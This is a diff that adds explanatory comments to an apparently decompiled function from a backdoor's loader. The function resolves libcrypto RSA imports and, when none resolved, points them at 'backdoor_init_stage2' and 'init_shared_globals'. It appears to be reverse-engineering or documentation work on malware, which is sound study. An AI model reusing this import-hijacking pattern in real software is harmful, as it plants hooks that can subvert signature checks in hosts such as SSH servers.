@@ -17,7 +17,9 @@
 BOOL init_imported_funcs(imported_funcs_t *imported_funcs)
 
 {
+  // AutoDoc: Short-circuit unless the expected 0x1d-symbol libcrypto table was populated.
   if (imported_funcs->resolved_imports_count == 0x1d) {
+    // AutoDoc: Treat the imports as ready as soon as any RSA helper resolved; the hooks can now jump through the host PLT.
     if (imported_funcs->RSA_public_decrypt_plt != (pfn_RSA_public_decrypt_t *)0x0) {
       return TRUE;
     }
@@ -27,6 +29,7 @@ BOOL init_imported_funcs(imported_funcs_t *imported_funcs)
     if (imported_funcs->RSA_get0_key_plt != (pfn_RSA_get0_key_t *)0x0) {
       return TRUE;
     }
+    // AutoDoc: When none resolved, wire in the stage-two/bootstrap fallbacks so unexpected calls just re-enter our setup.
     imported_funcs->RSA_public_decrypt_plt = (pfn_RSA_public_decrypt_t *)backdoor_init_stage2;
     imported_funcs->RSA_get0_key_plt = (pfn_RSA_get0_key_t *)init_shared_globals;
   }
